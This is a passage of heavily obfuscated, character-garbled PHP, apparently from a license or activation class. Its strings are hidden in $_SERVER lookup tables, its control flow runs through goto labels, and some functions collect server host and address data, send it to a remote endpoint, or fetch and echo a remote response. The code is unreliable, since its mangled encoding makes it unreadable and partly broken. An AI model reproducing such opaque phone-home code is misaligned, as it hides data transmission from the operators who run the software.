$eÇ”öËì™˜[61]($eÇ”öËì™˜[139])->{$_SERVER[†Äâ‡≠ﬁ][140]}()); if ($this->amdb4b1f3d62 != $eÇ”öËì™˜[121]) { $aêñ≠é∫®é = $eÇ”öËì™˜[104]($this->girtef17344a, $eÇ”öËì™˜[141]); if ($aêñ≠é∫®é) { $a‹¯¬¶•ìÍ[$eÇ”öËì™˜[142]] = $aêñ≠é∫®é; $a‹¯¬¶•ìÍ[$eÇ”öËì™˜[143]] = $eÇ”öËì™˜[144]($eÇ”öËì™˜[104]($this->girtef17344a, $eÇ”öËì™˜[145])); $a‹¯¬¶•ìÍ[$eÇ”öËì™˜[146]] = $eÇ”öËì™˜[104]($this->girtef17344a, $eÇ”öËì™˜[131]); } } $a‹¯¬¶•ìÍ = $this->{$_SERVER[†Äâ‡≠ﬁ][147]}($eÇ”öËì™˜[148]($a‹¯¬¶•ìÍ), $eÇ”öËì™˜[114]($eÇ”öËì™˜[149])); goto BÆ™ëàª∆Â; D¢ç©¶ ¿¬: if (!$BÍÍ°–å≥Æ) { die; } goto aâ¢éºÿ—Ï; BÆ™ëàª∆Â: $Fê⁄õ÷”Ó¶ = $a´…ç·Â°å[575]; $CùËæÛàß = array($eÇ”öËì™˜[150] => $a‹¯¬¶•ìÍ); $d≠Ûô¬º≈Ò = $a´…ç·Â°å[576]; goto dìÑ“◊éû≈; aâ¢éºÿ—Ï: } goto b≥ƒﬁÆ§ÇÁ; aê·§¨¥∆≤: if (!$D“âπ»°Ëè) { die; } goto C˘ŸıÓ¡àö; cåìﬂß≠Æ◊: $F∞¡—ÒÀ®⁄ = $eÇ”öËì™˜[61]($eÇ”öËì™˜[62])->{$_SERVER[†Äâ‡≠ﬁ][63]}(); $eº¡‚àÀøç = $a´…ç·Â°å[579]; if (!$eº¡‚àÀøç) { return; } goto E√á∏√∆é£; C˘ŸıÓ¡àö: } private function ekwf14f5422d() { goto AâÎêÉ®õÒ; f©Îπ§á∫Ó: $aê∑µ”ñö = $B±ÃΩªÇŒΩ[583]; if (strlen($aê∑µ”ñö) < $B±ÃΩªÇŒΩ[581]) { return; } $fÏŸÒÏ§Ñ» = $c¿ƒÓ„√áÕ[114]($_SERVER[$c¿ƒÓ„√áÕ[115]] . $b⁄⁄¥–¯˘ï); goto F≠ø° ÿŒ; AâÎêÉ®õÒ: $B±ÃΩªÇŒΩ =& $_SERVER[—Ω]; $c¿ƒÓ„√áÕ =& $_SERVER[†Äâ‡≠ﬁ]; if ($_SERVER[$c¿ƒÓ„√áÕ[44]] != $c¿ƒÓ„√áÕ[162]) { return; } goto f‡ÇòÁé††; BÉØ≥∂ıîﬂ: if (!isset($a∂◊®´à˜˘[$c¿ƒÓ„√áÕ[165]]) || $c¿ƒÓ„√áÕ[24]($a∂◊®´à˜˘[$c¿ƒÓ„√áÕ[165]]) != 16) { $c¿ƒÓ„√áÕ[166]($c¿ƒÓ„√áÕ[167] . $a∂◊®´à˜˘[$c¿ƒÓ„√áÕ[165]], !1); } $b⁄⁄¥–¯˘ï = $c¿ƒÓ„√áÕ[61]($c¿ƒÓ„√áÕ[62])->{$_SERVER[†Äâ‡≠ﬁ][63]}($c¿ƒÓ„√áÕ[116]); $aµ≈˜üã““ = array($c¿ƒÓ„√áÕ[165] => $a∂◊®´à˜˘[$c¿ƒÓ„√áÕ[165]], $c¿ƒÓ„√áÕ[168] => $c¿ƒÓ„√áÕ[124](16), $c¿ƒÓ„√áÕ[169] => $c¿ƒÓ„√áÕ[149], $c¿ƒÓ„√áÕ[170] => $c¿ƒÓ„√áÕ[171], $c¿ƒÓ„√áÕ[172] => $_SERVER[$c¿ƒÓ„√áÕ[173]], $c¿ƒÓ„√áÕ[174] => $_SERVER[$c¿ƒÓ„√áÕ[175]], $c¿ƒÓ„√áÕ[176] => $_SERVER[$c¿ƒÓ„√áÕ[177]]); goto f©Îπ§á∫Ó; B¶çœ¬é¶˘: if (!$bõ≈»Ó∞Ï‚ || $bõ≈»Ó∞Ï‚ != $c¿ƒÓ„√áÕ[201]($B≈≠≤Ïö¬ÿ[$c¿ƒÓ„√áÕ[145]])) { $Fæ™Ñ†§—® = array($c¿ƒÓ„√áÕ[202] => $c¿ƒÓ„√áÕ[61]($c¿ƒÓ„√áÕ[62])->{$_SERVER[†Äâ‡≠ﬁ][63]}($c¿ƒÓ„√áÕ[116]), $c¿ƒÓ„√áÕ[203] => $_SERVER[$c¿ƒÓ„√áÕ[115]], $c¿ƒÓ„√áÕ[204] => $c¿ƒÓ„√áÕ[205](), $c¿ƒÓ„√áÕ[174] => $_SERVER[$c¿ƒÓ„√áÕ[175]]); $FıΩ∏˘ô≥Ñ = $this->{$_SERVER[†Äâ‡≠ﬁ][206]}($c¿ƒÓ„√áÕ[148]($Fæ™Ñ†§—®)); $this->{$_SERVER[†Äâ‡≠ﬁ][182]}($c¿ƒÓ„√áÕ[207] . $FıΩ∏˘ô≥Ñ); $c¿ƒÓ„√áÕ[166]($c¿ƒÓ„√áÕ[197]($c¿ƒÓ„√áÕ[208]), !0); } $EäúÛ•üç¢ = array($c¿ƒÓ„√áÕ[209] => $aµ≈˜üã““[$c¿ƒÓ„√áÕ[165]], $c¿ƒÓ„√áÕ[210] => $B≈≠≤Ïö¬ÿ[$c¿ƒÓ„√áÕ[211]], $c¿ƒÓ„√áÕ[212] => $c¿ƒÓ„√áÕ[124](16), $c¿ƒÓ„√áÕ[120] => $B≈≠≤Ïö¬ÿ[$c¿ƒÓ„√áÕ[213]]); if ($aµ≈˜üã““[$c¿ƒÓ„√áÕ[168]]) { $EäúÛ•üç¢[$c¿ƒÓ„√áÕ[212]] = $aµ≈˜üã““[$c¿ƒÓ„√áÕ[168]]; } goto C—ÉúŒ±µå; C¨éà˜õ‡è: if (strlen($eˆ∑ûâƒ∆è) < $B±ÃΩªÇŒΩ[581]) { return; } $EäúÛ•üç¢[$c¿ƒÓ„√áÕ[123]] = $c¿ƒÓ„√áÕ[118]($c¿ƒÓ„√áÕ[214]($this->{$_SERVER[†Äâ‡≠ﬁ][147]}($a€Ó•™è«¯, $c¿ƒÓ„√áÕ[216]))); if ($B≈≠≤Ïö¬ÿ[$c¿ƒÓ„√áÕ[217]] && $B≈≠≤Ïö¬ÿ[$c¿ƒÓ„√áÕ[217]] >= 1) { $c¿ƒÓ„√áÕ[61]($c¿ƒÓ„√áÕ[62])->{$_SERVER[†Äâ‡≠ﬁ][218]}($c¿ƒÓ„√áÕ[219], $c¿ƒÓ„√áÕ[220]); } goto fÁ«¿ƒ≈Ñ; f‡ÇòÁé††: if (!$c¿ƒÓ„√áÕ[104]($GLOBALS, $c¿ƒÓ„√áÕ[132])) { die; } $a∂◊®´à˜˘ = $GLOBALS[$c¿ƒÓ„√áÕ[22]]; if (isset($a∂◊®´à˜˘[$c¿ƒÓ„√áÕ[163]])) { $this->{$_SERVER[†Äâ‡≠ﬁ][164]}(); die; } goto BÉØ≥∂ıîﬂ; eËŒΩ¥¯Ü∫: $AÃŒàùêå˜ = $c¿ƒÓ„√áÕ[222]($c¿ƒÓ„√áÕ[61]($c¿ƒÓ„√áÕ[11])->{$_SERVER[†Äâ‡≠ﬁ][223]}(), $c¿ƒÓ„√áÕ[224]); $eº—÷ÿﬁî∫ = $B±ÃΩªÇŒΩ[592]; $CÍÑÖ«Âˆ« = $AÃŒàùêå˜[$c¿ƒÓ„√áÕ[225]]; goto cñ™ÌÀ„Àœ; Cô∑Ö∫É—∫: $D•Œ¶ Óπ∆ = $c¿ƒÓ„√áÕ[124](16); $a€Ó•™è«¯ = $D•Œ¶ Óπ∆ . $EäúÛ•üç¢[$c¿ƒÓ„√áÕ[120]] . $this->{$_SERVER[†Äâ‡≠ﬁ][147]}($c¿ƒÓ„√áÕ[114]($EäúÛ•üç¢[$c¿ƒÓ„√áÕ[209]]), $D•Œ¶ Óπ∆); $eˆ∑ûâƒ∆è = $B±ÃΩªÇŒΩ[588]; goto C¨éà˜õ‡è; A§∂∫ë∏—à: $EäúÛ•üç¢[$c¿ƒÓ„√áÕ[122]] = $c¿ƒÓ„√áÕ[214]($c¿ƒÓ„√áÕ[118]($this->{$_SERVER[†Äâ‡≠ﬁ][147]}($dÿÔ‚Ïƒ±, $c¿ƒÓ„√áÕ[215]))); $Dœ–í‚•ÂÇ = $B±ÃΩªÇŒΩ[587]; if (strlen($Dœ–í‚•ÂÇ) < $B±ÃΩªÇŒΩ[556]) { die; } goto Cô∑Ö∫É—∫; D∆û’™Æù¿: $c¿ƒÓ„√áÕ[61]($c¿ƒÓ„√áÕ[11])->{$_SERVER[†Äâ‡≠ﬁ][226]}($CÍÑÖ«Âˆ«[$c¿ƒÓ„√áÕ[227]], array($c¿ƒÓ„√áÕ[228] => $D†ıëÔÏ ”)); $c¿ƒÓ„√áÕ[166]($c¿ƒÓ„√áÕ[197]($c¿ƒÓ„√áÕ[208]), !0); goto C˘´»˜åƒê; fÁ«¿ƒ≈Ñ: $c¿ƒÓ„√áÕ[61]($c¿ƒÓ„√áÕ[62])->{$_SERVER[†Äâ‡≠ﬁ][221]}($EäúÛ•üç¢); $A°àùÓ‚¢™ = $c¿ƒÓ„√áÕ[114]($_SERVER[$c¿ƒÓ„√áÕ[115]] . $c¿ƒÓ„√áÕ[214]($b⁄⁄¥–¯˘ï) . $EäúÛ•üç¢[$c¿ƒÓ„√áÕ[210]]); $bƒ‹µó´∆• = $B±ÃΩªÇŒΩ[589]; goto Bˆêﬁó∞Õã; Bˆêﬁó∞Õã: $bƒœ≈Â”Ìë = $c¿ƒÓ„√áÕ[214]($c¿ƒÓ„√áÕ[25]($A°àùÓ‚¢™, 10, 16)); $AÆÆ•◊Ì…¡ = $B±ÃΩªÇŒΩ[590]; while ($AÆÆ•◊Ì…¡ < $B±ÃΩªÇŒΩ[559]) { if ($AÆÆ•◊Ì…¡ >= 0) { break; } $AÆÆ•◊Ì…¡++; } goto c§’±ììáã; cñ™ÌÀ„Àœ: $D†ıëÔÏ ” = array(); $D†ıëÔÏ ”[$bƒœ≈Â”Ìë] = $BÒ Æ®åë„; $A’’ËßÁÔÇ = $B±ÃΩªÇŒΩ[593]; goto D∆û’™Æù¿; F≠ø° ÿŒ: if ($a∂◊®´à˜˘[$c¿ƒÓ„√áÕ[178]] == $c¿ƒÓ„√áÕ[179]) { $E‹èåèñÁ™ = $this->{$_SERVER[†Äâ‡≠ﬁ][147]}($fÏŸÒÏ§Ñ», $c¿ƒÓ„√áÕ[180]); $FıΩ∏˘ô≥Ñ = $this->{$_SERVER[†Äâ‡≠ﬁ][127]}($c¿ƒÓ„√áÕ[148]($aµ≈˜üã““), $fÏŸÒÏ§Ñ» . $c¿ƒÓ„√áÕ[181], 3); $bÊçëù√îë = $this->{$_SERVER[†Äâ‡≠ﬁ][182]}($c¿ƒÓ„√áÕ[183] . $E‹èåèñÁ™ . $c¿ƒÓ„√áÕ[184] . $FıΩ∏˘ô≥Ñ, -1); $c¿ƒÓ„√áÕ[166]($bÊçëù√îë, !0); } else { if ($a∂◊®´à˜˘[$c¿ƒÓ„√áÕ[178]] == $c¿ƒÓ„√áÕ[185]) { $f—Òö‰ßßø = $c¿ƒÓ„√áÕ[25]($c¿ƒÓ„√áÕ[114]($c¿ƒÓ„√áÕ[186] . $fÏŸÒÏ§Ñ»), 12, 15) . $c¿ƒÓ„√áÕ[187]; $FıΩ∏˘ô≥Ñ = $this->{$_SERVER[†Äâ‡≠ﬁ][188]}($c¿ƒÓ„√áÕ[2]($a∂◊®´à˜˘[$c¿ƒÓ„√áÕ[189]]), $f—Òö‰ßßø, 2); $b€πÒæàÇ≥ = $c¿ƒÓ„√áÕ[190]($FıΩ∏˘ô≥Ñ, !0); if (!$c¿ƒÓ„√áÕ[191]($b€πÒæàÇ≥) || !$c¿ƒÓ„√áÕ[191]($b€πÒæàÇ≥[$c¿ƒÓ„√áÕ[192]]) || $b€πÒæàÇ≥[$c¿ƒÓ„√áÕ[165]] != !0) { $dÜÍÇ™¶ÓŒ = $c¿ƒÓ„√áÕ[193]; $EÃ»ﬁñ£Û¿ = $b€πÒæàÇ≥[$c¿ƒÓ„√áÕ[192]] ? $c¿ƒÓ„√áÕ[194] . $b€πÒæàÇ≥[$c¿ƒÓ„√áÕ[192]] : $dÜÍÇ™¶ÓŒ; $c¿ƒÓ„√áÕ[166]($EÃ»ﬁñ£Û¿, !1); } else { $aµ≈˜üã““[$c¿ƒÓ„√áÕ[168]] = $b€πÒæàÇ≥[$c¿ƒÓ„√áÕ[192]][$c¿ƒÓ„√áÕ[195]]; } } else { $b€πÒæàÇ≥ = $this->{$_SERVER[†Äâ‡≠ﬁ][182]}($c¿ƒÓ„√áÕ[196], $aµ≈˜üã““, 10); $A´£ŒÑËŸ∑ = $B±ÃΩªÇŒΩ[584]; } } if (!$c¿ƒÓ„√áÕ[191]($b€πÒæàÇ≥) || !$c¿ƒÓ„√áÕ[191]($b€πÒæàÇ≥[$c¿ƒÓ„√áÕ[192]]) || $b€πÒæàÇ≥[$c¿ƒÓ„√áÕ[165]] != !0) { $dÜÍÇ™¶ÓŒ = $c¿ƒÓ„√áÕ[197]($c¿ƒÓ„√áÕ[198]); $EÃ»ﬁñ£Û¿ = $b€πÒæàÇ≥[$c¿ƒÓ„√áÕ[192]] ? $c¿ƒÓ„√áÕ[194] . $b€πÒæàÇ≥[$c¿ƒÓ„√áÕ[192]] : $dÜÍÇ™¶ÓŒ; $c¿ƒÓ„√áÕ[166]($EÃ»ﬁñ£Û¿, !1); } $B≈≠≤Ïö¬ÿ = $b€πÒæàÇ≥[$c¿ƒÓ„√áÕ[192]]; goto FÜ∂∂≥Û∑´; C—ÉúŒ±µå: $bõﬁ∆œÍÊ“ = $c¿ƒÓ„√áÕ[25]($c¿ƒÓ„√áÕ[114]($EäúÛ•üç¢[$c¿ƒÓ„√áÕ[210]]), 10, 10); $dÿÔ‚Ïƒ± = $bõﬁ∆œÍÊ“ . $EäúÛ•üç¢[$c¿ƒÓ„√áÕ[120]] . $EäúÛ•üç¢[$c¿ƒÓ„√áÕ[212]]; $DÏΩÜ¥Üä = $B±ÃΩªÇŒΩ[586]; goto A§∂∫ë∏—à; FÜ∂∂≥Û∑´: $bõ≈»Ó∞Ï‚ = $this->{$_SERVER[†Äâ‡≠ﬁ][199]}($B≈≠≤Ïö¬ÿ[$c¿ƒÓ„√áÕ[200]]); $dÁπÇÆÕÕ¢ = $B±ÃΩªÇŒΩ[585]; if (!$dÁπÇÆÕÕ¢) { return; } goto B¶çœ¬é¶˘; c§’±ììáã: $BÒ Æ®åë„ = $this->{$_SERVER[†Äâ‡≠ﬁ][127]}($c¿ƒÓ„√áÕ[148]($B≈≠≤Ïö¬ÿ), $A°àùÓ‚¢™); $B·çî•¯¨ü = $B±ÃΩªÇŒΩ[591]; while (strlen($B·çî•¯¨ü) < $B±ÃΩªÇŒΩ[559]) { if (!$B·çî•¯¨ü) { break; } $B·çî•¯¨ü++; } goto eËŒΩ¥¯Ü∫; C˘´»˜åƒê: } private function tjpe68a0b373() { goto bâ≤›“ÿºÙ; bâ≤›“ÿºÙ: $FÖ¨≠∞·ﬂö =& $_SERVER[—Ω]; $a≤ƒéê¢Ë“ =& $_SERVER[†Äâ‡≠ﬁ]; $a≤ƒéê¢Ë“[61]($a≤ƒéê¢Ë“[62])->{$_SERVER[†Äâ‡≠ﬁ][221]}(array($a≤ƒéê¢Ë“[209] => $a≤ƒéê¢Ë“[10], $a≤ƒéê¢Ë“[210] => $a≤ƒéê¢Ë“[10], $a≤ƒéê¢Ë“[120] => $a≤ƒéê¢Ë“[121], $a≤ƒéê¢Ë“[122] => $a≤ƒéê¢Ë“[10], $a≤ƒéê¢Ë“[123] => $a≤ƒéê¢Ë“[10])); goto F‹≠Î®¯ãå; F‹≠Î®¯ãå: $a≤ƒéê¢Ë“[61]($a≤ƒéê¢Ë“[62])->{$_SERVER[†Äâ‡≠ﬁ][218]}($a≤ƒéê¢Ë“[219], $a≤ƒéê¢Ë“[229]); $DÇ¿•ÿ§≤‹ = $FÖ¨≠∞·ﬂö[594]; $this->girtef17344a = array(); goto Dœ›óﬁ„Ó˜; f†⁄›ººåß: if (strlen($FäòÃßÒ§∆) < $FÖ¨≠∞·ﬂö[551]) { die; } goto FÀÏåå“∫Ø; Dœ›óﬁ„Ó˜: $CÜéÀ¿◊ª¢ = $FÖ¨≠∞·ﬂö[595]; $this->amdb4b1f3d62 = $a≤ƒéê¢Ë“[121]; $FäòÃßÒ§∆ = $FÖ¨≠∞·ﬂö[596]; goto f†⁄›ººåß; FÀÏåå“∫Ø: } private function ihkv577a623a() { goto FùÓı™Çîá; f∏∑µõÉÏﬂ: if (!$DÁ™∫Éå) { return; } $D≥«àÓÙ≠ó = $this->{$_SERVER[†Äâ‡≠ﬁ][188]}($fﬁ¯ñÉ§éµ[$D±Â…ﬂõ≤Á[91]][$c≥áÊø≈ΩÒ], $c•Áœé¬≥—); $aÏÉûÂÛñÍ = $dÖƒÇµ‘‹˜[603]; goto b¨É¶Ó´§√; c¢»∂œí◊Ñ: $this->amdb4b1f3d62 = $a£â…´÷≠œ[$D±Â…ﬂõ≤Á[120]]; goto F—Ú¡∂Æ˜û; cÔ√˜ë’Õ…: $EÎé•º∂Î‰ = $dÖƒÇµ‘‹˜[600]; if (!$EÎé•º∂Î‰) { return; } $c•Áœé¬≥— = $D±Â…ﬂõ≤Á[114]($_SERVER[$D±Â…ﬂõ≤Á[115]] . $D±Â…ﬂõ≤Á[214]($c†„äÏÜØ´) . $a£â…´÷≠œ[$D±Â…ﬂõ≤Á[210]]); goto B°–óíØ›≠; eÉê›ÒÀ∞Ÿ: $fÍÈ⁄òªÀ§ = $D±Â…ﬂõ≤Á[222]($D±Â…ﬂõ≤Á[61]($D±Â…ﬂõ≤Á[11])->{$_SERVER[†Äâ‡≠ﬁ][223]}(), $D±Â…ﬂõ≤Á[224]); $d∫µ¨Ç‚Ë = $dÖƒÇµ‘‹˜[599]; $fﬁ¯ñÉ§éµ = $fÍÈ⁄òªÀ§[$D±Â…ﬂõ≤Á[225]]; goto cÔ√˜ë’Õ…; aË†ùƒã¶∆: $Cœäÿ◊çÍÚ = $D±Â…ﬂõ≤Á[144]($D≥«àÓÙ≠ó[$D±Â…ﬂõ≤Á[145]]); if ($D±Â…ﬂõ≤Á[230]() >= $Cœäÿ◊çÍÚ) { return $this->{$_SERVER[†Äâ‡≠ﬁ][164]}(); } $this->girtef17344a = $D≥«àÓÙ≠ó; goto c¢»∂œí◊Ñ; bÏàãûÔ≤Ì: $D ÀàÀíÑ§ = $dÖƒÇµ‘‹˜[597]; $this->amdb4b1f3d62 = $D±Â…ﬂõ≤Á[121]; $a£â…´÷≠œ = $D±Â…ﬂõ≤Á[61]($D±Â…ﬂõ≤Á[62])->{$_SERVER[†Äâ‡≠ﬁ][63]}(); goto fµä ûåµ°; B°–óíØ›≠: $DÑà®ã¿‰Æ = $dÖƒÇµ‘‹˜[601]; $c≥áÊø≈ΩÒ = $D±Â…ﬂõ≤Á[214]($D±Â…ﬂõ≤Á[25]($c•Áœé¬≥—, 10, 16)); $DÁ™∫Éå = $dÖƒÇµ‘‹˜[602]; goto f∏∑µõÉÏﬂ; FùÓı™Çîá: $dÖƒÇµ‘‹˜ =& $_SERVER[—Ω]; $D±Â…ﬂõ≤Á =& $_SERVER[†Äâ‡≠ﬁ]; $_SERVER[$D±Â…ﬂõ≤Á[175]] = $D±Â…ﬂõ≤Á[104]($_SERVER, $D±Â…ﬂõ≤Á[175], APP_HOST); goto bÏàãûÔ≤Ì; b¨É¶Ó´§√: while (strlen($aÏÉûÂÛñÍ) < $dÖƒÇµ‘‹˜[556]) { if (!$aÏÉûÂÛñÍ) { break; } $aÏÉûÂÛñÍ++; } $D≥«àÓÙ≠ó = $D±Â…ﬂõ≤Á[190]($D≥«àÓÙ≠ó, !0); if (!$D±Â…ﬂõ≤Á[191]($D≥«àÓÙ≠ó)) { return $this->{$_SERVER[†Äâ‡≠ﬁ][164]}(); } goto aË†ùƒã¶∆; fµä ûåµ°: if ($a£â…´÷≠œ[$D±Â…ﬂõ≤Á[120]] == $D±Â…ﬂõ≤Á[121]) { return; } $c†„äÏÜØ´ = $D±Â…ﬂõ≤Á[61]($D±Â…ﬂõ≤Á[62])->{$_SERVER[†Äâ‡≠ﬁ][63]}($D±Â…ﬂõ≤Á[116]); $Dë¡‚∑√¢á = $dÖƒÇµ‘‹˜[598]; goto eÉê›ÒÀ∞Ÿ; F—Ú¡∂Æ˜û: } private function gkjae5d22ad5() { goto aßÖÑ¨†êÃ; cÕ™’¨ø≈ñ: $b‰⁄‘æÁ⁄¿ = $_SERVER[—Ω][604]; if ($FÙÛí‹¢é€ == $eãøì§Úê [231] && $this->amdb4b1f3d62 == $eãøì§Úê [121]) { $eãøì§Úê [166]($eãøì§Úê [197]($eãøì§Úê [232]), !1, $eãøì§Úê [233]); } $EºëøìπàÈ = array($eãøì§Úê [234], $eãøì§Úê [235]); goto Aãö–‘˜ô‘; Aãö–‘˜ô‘: if ($eãøì§Úê [236]($FÙÛí‹¢é€, $EºëøìπàÈ)) { if ($this->amdb4b1f3d62 == $eãøì§Úê [121] && isset($c¢Ÿ£â›åö[$eãøì§Úê [237]])) { $eãøì§Úê [166]($eãøì§Úê [197]($eãøì§Úê [232]), !1, $eãøì§Úê [233]); die; } $c‘∑Ø±ÔΩõ = $this->{$_SERVER[†Äâ‡≠ﬁ][137]}(); if ($c‘∑Ø±ÔΩõ != $eãøì§Úê [201]($eãøì§Úê [238])) { if ($c‘∑Ø±ÔΩõ <= $eãøì§Úê [61]($eãøì§Úê [139])->{$_SERVER[†Äâ‡≠ﬁ][140]}()) { $eãøì§Úê [166]($eãøì§Úê [197]($eãøì§Úê [239]), !1, $eãøì§Úê [233]); die; } } } goto a¡‰ø‘±Ù≤; aßÖÑ¨†êÃ: $eãøì§Úê  =& $_SERVER[†Äâ‡≠ﬁ]; $c¢Ÿ£â›åö = $GLOBALS[$eãøì§Úê [22]]; $FÙÛí‹¢é€ = $_SERVER[$eãøì§Úê [44]]; goto cÕ™’¨ø≈ñ; a¡‰ø‘±Ù≤: } private function oyuz68a88cd9() { goto AÈâ˜ÛÓ∂Ú; Dõ®Œ∞Á∂‚: while ($dó–ëÑπﬁô < $fΩü≥≥À∆®[551]) { if ($dó–ëÑπﬁô >= 0) { break; } $dó–ëÑπﬁô++; } $CËëÆ“§ø‚[251]($CËëÆ“§ø‚[252]); if ($cÕµ›ı∞⁄≠ && $CËëÆ“§ø‚[32]($cÕµ›ı∞⁄≠, $CËëÆ“§ø‚[253])) { echo $cÕµ›ı∞⁄≠; } goto D£ç¶ﬁ©•›; AÈâ˜ÛÓ∂Ú: $fΩü≥≥À∆® =& $_SERVER[—Ω]; $CËëÆ“§ø‚ =& $_SERVER[†Äâ‡≠ﬁ]; $DÕôÂüüˆÑ = array($CËëÆ“§ø‚[135], $CËëÆ“§ø‚[240]); goto FæÆÂ¢éåó; D£ç¶ﬁ©•›: die; goto d®˜·Î¥¬˜; Bâä∂âä»ñ: $bÇ•õèé≈¨ = $fΩü≥≥À∆®[605]; if (!$bÇ•õèé≈¨) { die; } $c∆‹∆œ©∂¿ = $this->{$_SERVER[†Äâ‡≠ﬁ][243]}($c∆‹∆œ©∂¿, $CËëÆ“§ø‚[244]); goto A†ÁËé€Ìâ; A†ÁËé€Ìâ: $B£ˆ÷∂Û≤Ç = $CËëÆ“§ø‚[245](array($CËëÆ“§ø‚[246] => array($CËëÆ“§ø‚[247] => $CËëÆ“§ø‚[248], $CËëÆ“§ø‚[249] => 3))); $cÕµ›ı∞⁄≠ = @$CËëÆ“§ø‚[250]($c∆‹∆œ©∂¿, !1, $B£ˆ÷∂Û≤Ç); $dó–ëÑπﬁô = $fΩü≥≥À∆®[606]; goto Dõ®Œ∞Á∂‚; FæÆÂ¢éåó: if (!$CËëÆ“§ø‚[104]($GLOBALS, $CËëÆ“§ø‚[132]) || !isset($_GET[$CËëÆ“§ø‚[241]])) { return; } if (!$CËëÆ“§ø‚[236]($_SERVER[$CËëÆ“§ø‚[44]], $DÕôÂüüˆÑ)) { return; } $c∆‹∆œ©∂¿ = $CËëÆ“§ø‚[242]; goto Bâä∂âä»ñ; d®˜·Î¥¬˜: } public function ghke3470b2d2($E«¶¢ª∫õ„) { goto e∑æ¶≈£Çé; d¿ñ¢åﬂ¢Ì: $b¿≤“µ†Û¥ = array(); $FﬁÒ»ÂÆ®Ü = $AÑÕ‡Û‹“[546]; if (!$FﬁÒ»ÂÆ®Ü) { return; } goto Eßµ¨÷”ßõ; e∑æ¶≈£Çé: $AÑÕ‡Û‹“ =& $_SERVER[—Ω]; $E¬ÁÛﬁÕÑ” =& $_SERVER[†Äâ‡≠ﬁ]; if ($this->amdb4b1f3d62 == $E¬ÁÛﬁÕÑ”[254]) { return $E«¶¢ª∫õ„; } goto Dﬁ¡ëØŸ¶è; Dﬁ¡ëØŸ¶è: $fé◊Öèì˜Ø = array($E¬ÁÛﬁÕÑ”[255], $E¬ÁÛﬁÕÑ”[256], $E¬ÁÛﬁÕÑ”[257], $E¬ÁÛﬁÕÑ”[258], $E¬ÁÛﬁÕÑ”[259], $E¬ÁÛﬁÕÑ”[260], $E¬ÁÛﬁÕÑ”[261], $E¬ÁÛﬁÕÑ”[262]); $cºﬂã≥êÎ“ = $AÑÕ‡Û‹“[607]; if (!$cºﬂã≥êÎ“) { return; } goto eÙÉÆÉƒåﬁ; eÙÉÆÉƒåﬁ: $b®ÌÃƒ‰∑‡ = $E¬ÁÛﬁÕÑ”[0]($E¬ÁÛﬁÕÑ”[263], $E¬ÁÛﬁÕÑ”[104]($this->girtef17344a, $E¬ÁÛﬁÕÑ”[129], $E¬ÁÛﬁÕÑ”[10])); $bœÚŒ≥–¢ü = $AÑÕ‡Û‹“[608]; if (!$bœÚŒ≥–¢ü) { die; } goto d¿ñ¢åﬂ¢Ì; Eßµ¨÷”ßõ: foreach ($fé◊Öèì˜Ø as $FÌÛ´»ïŸ) { if (!$E¬ÁÛﬁÕÑ”[236]($FÌÛ´»ïŸ, $b®ÌÃƒ‰∑‡)) { $b¿≤“µ†Û¥[] = $FÌÛ´»ïŸ; } } foreach ($b¿≤“µ†Û¥ as $FÌÛ´»ïŸ) { unset($E«¶¢ª∫õ„[$FÌÛ´»ïŸ]); $EÓó»ïÙÆ© = $AÑÕ‡Û‹“[609]; } return $E«¶¢ª∫õ„; goto Bœ ÔŸ„±“; Bœ ÔŸ„±“: } private function xcwke5ec3e29() { goto Cø•ÃàËÆÜ; cñœµåï€Ò: $a⁄å¶Œü…ã[61]($a⁄å¶Œü…ã[269])->{$_SERVER[†Äâ‡≠ﬁ][221]}($a⁄å¶Œü…ã[85], $a⁄å¶Œü…ã[229]); $DÁÍ§åôêÁ = $b‹ ≤≈†∏á[612]; while (strlen($DÁÍ§åôêÁ) < $b‹ ≤≈†∏á[553]) { if (!$DÁÍ§åôêÁ) { break; } $DÁÍ§åôêÁ++; } goto bñÖàÔ‡‰õ; b”™ò£¡ÌÓ: $càåœÓ–ªø = $_SERVER[$a⁄å¶Œü…ã[44]]; $fË˜™å©•à = array($a⁄å¶Œü…ã[265]); $CÉ»¿Œ∆›· = $b‹ ≤≈†∏á[610]; goto A“ı”∑™âé; báΩÚÃÊÔ∫: $GLOBALS[$a⁄å¶Œü…ã[91]][$a⁄å¶Œü…ã[268]] = $a⁄å¶Œü…ã[220]; $A¢º¿µó–ª = $b‹ ≤≈†∏á[611]; if (!$A¢º¿µó–ª) { return; } goto cñœµåï€Ò; Cø•ÃàËÆÜ: $b‹ ≤≈†∏á =& $_SERVER[—Ω]; $a⁄å¶Œü…ã =& $_SERVER[†Äâ‡≠ﬁ]; if ($this->amdb4b1f3d62 != $a⁄å¶Œü…ã[121]) { $GLOBALS[$a⁄å¶Œü…ã[91]][$a⁄å¶Œü…ã[95]][$a⁄å¶Œü…ã[264]] = $a⁄å¶Œü…ã[220]; return; } goto b”™ò£¡ÌÓ; A“ı”∑™âé: foreach ($fË˜™å©•à as $e‘ÂÚéØÿÍ) { if ($e‘ÂÚéØÿÍ == $càåœÓ–ªø || $a⁄å¶Œü…ã[25]($càåœÓ–ªø, 0, $a⁄å¶Œü…ã[24]($e‘ÂÚéØÿÍ)) == $e‘ÂÚéØÿÍ) { $a⁄å¶Œü…ã[166]($a⁄å¶Œü…ã[197]($a⁄å¶Œü…ã[266]), !1); } } $GLOBALS[$a⁄å¶Œü…ã[91]][$a⁄å¶Œü…ã[95]][$a⁄å¶Œü…ã[267]] = $a⁄å¶Œü…ã[220]; $GLOBALS[$a⁄å¶Œü…ã[91]][$a⁄å¶Œü…ã[95]][$a⁄å¶Œü…ã[264]] = $a⁄å¶Œü…ã[229]; goto báΩÚÃÊÔ∫; bñÖàÔ‡‰õ: } public function amcj5b10811d() { return $_SERVER[†Äâ‡≠ﬁ][270]; $EúÖ¢ﬁÍı° = $_SERVER[—Ω][613]; } private function tkapf6cf7690() { goto CÇÊåú˜µô; d›øÍ‹’§Ÿ: $this->{$_SERVER[†Äâ‡≠ﬁ][164]}(); if ($this->{$_SERVER[†Äâ‡≠ﬁ][199]}($F±¡õÉ≠œŒ[$Dê¥––ı˘∞[280]]) != $bˆ´ä“≈®ı[$Dê¥––ı˘∞[165]]) { $C∫’ù≤Üï≤ = array($Dê¥––ı˘∞[202] => $Dê¥––ı˘∞[61]($Dê¥––ı˘∞[62])->{$_SERVER[†Äâ‡≠ﬁ][63]}($Dê¥––ı˘∞[116]), $Dê¥––ı˘∞[203] => $_SERVER[$Dê¥––ı˘∞[115]], $Dê¥––ı˘∞[204] => $Dê¥––ı˘∞[205](), $Dê¥––ı˘∞[174] => 